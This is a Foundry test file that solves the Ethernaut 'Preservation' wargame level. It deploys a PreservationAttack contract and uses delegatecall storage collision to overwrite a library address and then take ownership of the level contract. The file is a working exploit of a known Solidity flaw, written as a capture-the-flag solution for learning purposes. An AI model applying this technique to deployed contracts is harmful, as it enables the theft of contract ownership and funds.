// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/16-Preservation/Preservation.sol";
import "../src/levels/16-Preservation/PreservationFactory.sol";

contract PreservationTest is Test {
    Ethernaut public ethernaut;
    PreservationFactory public preservationFactory;
    Preservation public preservation;

    address public attacker = address(0x1);
    address internal _levelAddr;

    function setUp() public {
        vm.deal(attacker, 10_000 ether);

        ethernaut = new Ethernaut();
        preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);

        vm.startPrank(attacker);
        _levelAddr = ethernaut.createLevelInstance{value: 100 ether}(
            preservationFactory
        );
        preservation = Preservation(payable(_levelAddr));
    }

    function testAttack() public {
        PreservationAttack attack = new PreservationAttack();

        // 1. Set first library contract address to attacker contract
        preservation.setFirstTime(uint256(uint160(address(attack))));

        // 2. From our malicious contract override the required storage variables
        preservation.setFirstTime(uint256(uint160(attacker)));

        // 3. Submit level
        bool success = ethernaut.submitLevelInstance(payable(_levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }
}

contract PreservationAttack {
    uint256 storedTime;
    uint256 storedTime2;
    address owner;

    function setTime(uint256 _time) public {
        storedTime = _time;
        storedTime2 = _time;
        owner = address(uint160(_time));
    }
}
